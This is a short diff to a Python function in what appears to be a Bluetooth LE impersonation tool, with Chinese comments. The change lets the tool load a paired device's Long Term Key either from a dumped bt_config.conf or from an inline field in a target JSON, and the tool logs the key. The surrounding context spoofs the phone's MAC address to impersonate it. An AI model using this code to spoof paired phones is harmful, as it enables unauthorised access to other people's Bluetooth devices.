@@ -101,23 +101,29 @@ def _run_locked(target, outdir, serport, bt_keys_path, keys_mac,
             fh.write(json.dumps(rec, ensure_ascii=False) + "\n")
 
     # ---- 1. 加载 bond 密钥 ----
-    if not bt_keys_path:
-        raise ImpersonationError("需要 --bt-keys 指定密钥文件(bt_config.conf 或 JSON)")
-    bonds = bt_keys.load_keys(bt_keys.resolve_path(bt_keys_path),
-                              target_mac=keys_mac)
-    if not bonds:
-        raise ImpersonationError("密钥文件里没有可用 bond(目标节未匹配?试试 --keys-mac)")
-    # 取第一个有 LTK 的 bond
-    bond = next((b for b in bonds if b.ltk), None)
-    if bond is None:
-        raise ImpersonationError("bond 无 LTK(LE_KEY_PENC 缺失)")
-    ltk_wire = bond.ltk   # dump 序;enable_encryption 内部反转
-    log.info("bond: %s ltk=%s rand=%s ediv=%s",
-             bond.name or bond.section, ltk_wire.hex(),
-             bond.rand.hex() if bond.rand else "?",
-             bond.ediv.hex() if bond.ediv else "?")
-    record(kind="bond_loaded", name=bond.name, section=bond.section,
-           ltk=ltk_wire.hex(), key_size=bond.key_size)
+    # 优先级：bt_keys 文件 > target JSON ltk 字段
+    if bt_keys_path:
+        bonds = bt_keys.load_keys(bt_keys.resolve_path(bt_keys_path),
+                                  target_mac=keys_mac)
+        if not bonds:
+            raise ImpersonationError("密钥文件里没有可用 bond(目标节未匹配?试试 --keys-mac)")
+        bond = next((b for b in bonds if b.ltk), None)
+        if bond is None:
+            raise ImpersonationError("bond 无 LTK(LE_KEY_PENC 缺失)")
+        ltk_wire = bond.ltk   # dump 序;enable_encryption 内部反转
+        log.info("bond: %s ltk=%s rand=%s ediv=%s",
+                 bond.name or bond.section, ltk_wire.hex(),
+                 bond.rand.hex() if bond.rand else "?",
+                 bond.ediv.hex() if bond.ediv else "?")
+        record(kind="bond_loaded", name=bond.name, section=bond.section,
+               ltk=ltk_wire.hex(), key_size=bond.key_size)
+    elif target.get("ltk"):
+        ltk_wire = bytes.fromhex(target["ltk"])
+        log.info("using inline LTK from target JSON: %s...", ltk_wire.hex()[:16])
+        record(kind="bond_loaded", name="target.json", ltk=ltk_wire.hex(),
+               key_size=16)
+    else:
+        raise ImpersonationError("需要 bt_keys 文件或 target JSON ltk 字段")
 
     # ---- 2. 设我们的地址 = 手机 public MAC(冒充) ----
     if not phone_mac:
